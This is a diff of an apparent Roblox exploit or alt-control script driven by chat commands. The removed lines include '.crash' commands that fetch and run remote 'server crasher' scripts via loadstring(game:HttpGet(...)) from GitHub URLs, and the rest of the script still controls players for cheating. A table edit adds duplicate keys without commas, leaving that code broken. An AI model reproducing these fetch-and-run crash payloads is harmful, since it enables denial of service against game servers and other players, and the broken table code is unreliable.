@@ -352,11 +352,6 @@ local CurrAnim
 local AbbreviationOptions = {
 	["k"] = 1000,
 	["m"] = 1000000
-    ["m"] = 2000000
-    ["m"] = 3000000
-    ["m"] = 4000000
-    ["m"] = 5000000
-
 }
 
 local function GetNumberFromText(str)
@@ -431,76 +426,6 @@ local function Initiate()
 				elseif PointInTable <= 40 then
 					ZAxis = -8
 					angle = (40-PointInTable)
-				end
-				angle = angle*36
-				local Clone = game.Players.LocalPlayer.Character
-				Clone.HumanoidRootPart.CFrame = cfr * CFrame.fromEulerAnglesXYZ(0,math.rad(angle),0) * CFrame.new(0,-size,-10)
-				Clone.HumanoidRootPart.CFrame=Clone.HumanoidRootPart.CFrame*CFrame.new(0,0,2)
-				Clone.HumanoidRootPart.CFrame=Clone.HumanoidRootPart.CFrame*CFrame.Angles(0,math.rad(180),0)
-			elseif Args[1] == ".crash" and Args[2] == "swag" and not Crashed then
-				local Player = GetPlayerFromString(Args[3],true)
-				if Player and Player == game.Players.LocalPlayer then
-					if game.CoreGui:FindFirstChild("RenderScreen") then
-						game.CoreGui.RenderScreen:Destroy()
-					end
-					game:GetService("RunService"):Set3dRenderingEnabled(true)
-					Crashed = true
-					loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()
-					for Index,Var in pairs(CmdSettings) do
-						CmdSettings[Var] = nil
-					end
-					CmdSettings = {}
-					setfpscap(60)
-					wait(1)
-					setfpscap(60)
-					wait(1)
-					setfpscap(60)
-					wait(1)
-					setfpscap(60)	
-				end
-			elseif Args[1] == ".crash" and Args[2] == "encrypt" and not Crashed then
-				local Player = GetPlayerFromString(Args[3],true)
-				if Player and Player == game.Players.LocalPlayer then
-					if game.CoreGui:FindFirstChild("RenderScreen") then
-						game.CoreGui.RenderScreen:Destroy()
-					end
-					game:GetService("RunService"):Set3dRenderingEnabled(true)
-					Crashed = true
-					loadstring(game:HttpGet("https://raw.githubusercontent.com/remorseW/encryptW/main/CustomEncryptCrasher.lua"))()
-
-					for Index,Var in pairs(CmdSettings) do
-						CmdSettings[Var] = nil
-					end
-					CmdSettings = {}
-					setfpscap(60)
-					wait(1)
-					setfpscap(60)
-					wait(1)
-					setfpscap(60)
-					wait(1)
-					setfpscap(60)	
-				end
-			elseif Args[1] == ".crash" and Args[2] == "15min" and not Crashed then
-				local Player = GetPlayerFromString(Args[3],true)
-				if Player and Player == game.Players.LocalPlayer then
-					if game.CoreGui:FindFirstChild("RenderScreen") then
-						game.CoreGui.RenderScreen:Destroy()
-					end
-					game:GetService("RunService"):Set3dRenderingEnabled(true)
-					Crashed = true
-					loadstring(game:HttpGet("https://raw.githubusercontent.com/remorseW/encryptW/main/DahooSuperQuickCrash.lua"))()
-
-					for Index,Var in pairs(CmdSettings) do
-						CmdSettings[Var] = nil
-					end
-					CmdSettings = {}
-					setfpscap(60)
-					wait(1)
-					setfpscap(60)
-					wait(1)
-					setfpscap(60)
-					wait(1)
-					setfpscap(60)	
 				end
 			elseif Args[1] == ".stopdrop" then
 				Drop(false)
@@ -579,16 +504,7 @@ local function Initiate()
 			elseif Message == ".shuffle" then
 				if CurrAnim and CurrAnim.IsPlaying then
 					CurrAnim:Stop()
-				end
-                local Anim = Instance.new("Animation")
-				Anim.AnimationId = "http://www.roblox.com/asset/?id=12874468267"
-				CurrAnim = game.Players.LocalPlayer.Character.Humanoid.Animator:LoadAnimation(Anim)
-				CurrAnim:Play()
-				CurrAnim:AdjustSpeed()
-			elseif Message == ".boogie" then
-				if CurrAnim and CurrAnim.IsPlaying then
-					CurrAnim:Stop()
-				end
+                end
 				local Anim = Instance.new("Animation")
 				Anim.AnimationId = "http://www.roblox.com/asset/?id=4349242221"
 				CurrAnim = game.Players.LocalPlayer.Character.Humanoid.Animator:LoadAnimation(Anim)
